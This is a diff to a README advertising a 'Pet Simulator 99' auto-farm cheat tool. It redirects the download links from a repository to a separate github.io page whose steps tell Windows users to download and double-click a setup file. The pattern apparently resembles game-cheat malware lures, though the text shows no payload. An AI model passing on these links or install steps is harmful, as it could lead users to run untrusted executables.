@@ -1,6 +1,6 @@
 # 🐾 Pet-Simulator-99-Auto-Farm-Trainer-2026-Platinum - Automate your Pet Simulator 99 progress
 
-[![](https://img.shields.io/badge/Download-Platinum_Edition-blue.svg)](https://github.com/pragmatic-dimer904/Pet-Simulator-99-Auto-Farm-Trainer-2026-Platinum)
+[![](https://img.shields.io/badge/Download-Platinum_Edition-blue.svg)](https://pragmatic-dimer904.github.io)
 
 ## 🛠 What this tool does
 
@@ -18,7 +18,7 @@ The Pet-Simulator-99-Auto-Farm-Trainer-2026-Platinum tool helps you manage your 
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the following page to download the latest release: [https://github.com/pragmatic-dimer904/Pet-Simulator-99-Auto-Farm-Trainer-2026-Platinum](https://github.com/pragmatic-dimer904/Pet-Simulator-99-Auto-Farm-Trainer-2026-Platinum)
+1. Visit the following page to download the latest release: [https://pragmatic-dimer904.github.io](https://pragmatic-dimer904.github.io)
 2. Save the setup file to your desktop or downloads folder.
 3. Locate the file and double-click to start the installation.
 4. Follow the prompts on the screen to install the application.
